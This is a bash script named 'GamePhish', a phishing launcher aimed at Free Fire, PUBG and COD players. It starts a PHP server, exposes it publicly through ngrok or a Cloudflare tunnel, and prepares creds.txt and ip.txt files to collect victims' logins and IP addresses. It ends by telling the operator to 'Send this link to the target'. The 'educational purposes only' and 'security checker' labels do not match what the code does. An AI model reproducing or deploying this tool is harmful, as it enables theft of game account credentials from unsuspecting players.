#!/bin/bash

# GamePhish - A tool for educational purposes only
# Created based on CamPhish structure

# Colors
red='\e[1;31m'
blue='\e[1;34m'
cyan='\e[1;36m'
purple='\e[1;35m'
yellow='\e[1;33m'
white='\e[1;37m'
none='\e[0m'

# Detect Windows
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    windows_mode=true
else
    windows_mode=false
fi

template=""
link=""

# Banner
banner() {
    clear
    printf "${blue}  ________                        _____  _     _     _     ${none}\n"
    printf "${blue} /  _____/_____    _____   ____   \\\\_____\\)\\/   / \\  /|    ${none}\n"
    printf "${blue}/   \\  ___\\__  \\  /     \\_/ __ \\    \\_   /\\\   /   \\/ /    ${none}\n"
    printf "${blue}\\    \\_\\  \\/ __ \\|  Y Y  \\  ___/     /    \\ /    \\ /     ${none}\n"
    printf "${blue} \\______  (____  /__|_|  /\\\___  >   /\\____/ \\/\\_/\\_/\\/\\  ${none}\n"
    printf "${blue}        \\/     \\/      \\/     \\/    \\/                  \\/  ${none}\n"
    printf "\n${yellow} [*] GamePhish - Game Account Security Checker${none}\n"
    printf "${yellow} [*] Created By: Security Researcher | For Educational Purposes Only${none}\n\n"
}

# Stop running processes
stop() {
    if [[ "$windows_mode" == true ]]; then
        # Windows-specific process termination
        taskkill /F /IM "ngrok.exe" 2>/dev/null
        taskkill /F /IM "php.exe" 2>/dev/null
        taskkill /F /IM "cloudflared.exe" 2>/dev/null
    else
        # Unix-like systems
        checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
        checkphp=$(ps aux | grep -o "php" | head -n1)
        checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)

        if [[ $checkngrok == *'ngrok'* ]]; then
            pkill -f -2 ngrok > /dev/null 2>&1
            killall -2 ngrok > /dev/null 2>&1
        fi

        if [[ $checkphp == *'php'* ]]; then
            killall -2 php > /dev/null 2>&1
        fi

        if [[ $checkcloudflared == *'cloudflared'* ]]; then
            pkill -f -2 cloudflared > /dev/null 2>&1
            killall -2 cloudflared > /dev/null 2>&1
        fi
    fi
    exit 1
}

# Check dependencies
dependencies() {
    command -v php > /dev/null 2>&1 || { 
        printf "${red} [*] PHP is required but not installed.${none}\n"
        exit 1
    }
    
    command -v wget > /dev/null 2>&1 || { 
        printf "${red} [*] wget is required but not installed.${none}\n"
        exit 1
    }
    
    command -v unzip > /dev/null 2>&1 || { 
        printf "${red} [*] unzip is required but not installed.${none}\n"
        exit 1
    }
}

# Create necessary files
create_files() {
    # Create data directory if not exists
    if [ ! -d "data" ]; then
        mkdir data
    fi
    
    # Create IP log file
    if [ ! -f "ip.txt" ]; then
        touch ip.txt
    fi
    
    # Create credentials file
    if [ ! -f "creds.txt" ]; then
        touch creds.txt
    fi
}

# Start PHP server
start_server() {
    printf "\n${yellow} [*] Starting PHP server...${none}\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
}

# Start ngrok
start_ngrok() {
    printf "\n${yellow} [*] Starting ngrok...${none}\n"
    if [[ "$windows_mode" == true ]]; then
        start ngrok http 3333
    else
        ngrok http 3333 > /dev/null 2>&1 &
    fi
    sleep 5
    
    # Get ngrok URL
    ngrok_url=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok\.io")
    link=$ngrok_url
}

# Start Cloudflare tunnel
start_cloudflared() {
    printf "\n${yellow} [*] Starting Cloudflare tunnel...${none}\n"
    if [[ "$windows_mode" == true ]]; then
        start cloudflared tunnel -url 127.0.0.1:3333
    else
        cloudflared tunnel -url 127.0.0.1:3333 > /dev/null 2>&1 &
    fi
    sleep 5
    
    # Get Cloudflare URL (this is a simplified version, actual implementation may vary)
    printf "${yellow} [*] Check the Cloudflare tunnel output for your URL${none}\n"
    link="https://your-cloudflare-tunnel-url.com"
}

# Main menu
menu() {
    banner
    printf "${blue} [01]${none} FREE FIRE\n"
    printf "${blue} [02]${none} PUBG\n"
    printf "${blue} [03]${none} COD\n"
    printf "${blue} [04]${none} Exit\n\n"
    
    read -p "${yellow} [*] Select an option: ${none}" option
    
    case $option in
        1 | 01)
            template="freefire"
            ;;
        2 | 02)
            template="pubg"
            ;;
        3 | 03)
            template="cod"
            ;;
        4 | 04)
            stop
            exit 0
            ;;
        *)
            printf "\n${red} [*] Invalid option!${none}\n"
            sleep 1
            menu
            ;;
    esac
    
    # Tunnel selection
    clear
    banner
    printf "${blue} [01]${none} Localhost\n"
    printf "${blue} [02]${none} Ngrok\n"
    printf "${blue} [03]${none} Cloudflare Tunnel\n"
    printf "${blue} [04]${none} Back to Main Menu\n\n"
    
    read -p "${yellow} [*] Choose tunneling method: ${none}" tunnel_option
    
    case $tunnel_option in
        1 | 01)
            start_server
            link="http://localhost:3333/${template}.html"
            ;;
        2 | 02)
            command -v ngrok > /dev/null 2>&1 || { 
                printf "${red} [*] ngrok is not installed. Please install it first.${none}\n"
                sleep 2
                menu
                return
            }
            start_server
            start_ngrok
            ;;
        3 | 03)
            command -v cloudflared > /dev/null 2>&1 || { 
                printf "${red} [*] cloudflared is not installed. Please install it first.${none}\n"
                sleep 2
                menu
                return
            }
            start_server
            start_cloudflared
            ;;
        4 | 04)
            menu
            return
            ;;
        *)
            printf "\n${red} [*] Invalid option!${none}\n"
            sleep 1
            menu
            return
            ;;
    esac
    
    printf "\n${yellow} [*] Send this link to the target: ${blue}${link}${none}\n"
    printf "${yellow} [*] Press Ctrl+C to stop.${none}\n"
    
    # Keep the script running
    wait
}

# Main execution
clear
dependencies
create_files
trap stop SIGINT
menu